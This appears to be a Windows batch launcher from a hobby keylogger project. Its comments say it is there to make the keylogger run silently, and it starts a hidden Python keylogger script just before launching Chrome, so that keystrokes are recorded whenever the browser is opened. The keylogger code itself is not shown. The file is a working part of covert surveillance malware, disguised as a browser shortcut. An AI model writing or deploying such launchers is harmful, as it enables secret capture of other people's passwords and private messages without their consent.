@echo off 
#to make sure that the keylogger runs silently

#Make sure that whenever chrome starts - out python keylogger script starts before that

start "" "C:\Users\Keshav Malpani\Documents\GitHub\Simple-Keylogger\keylogger.pyw"

start "" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
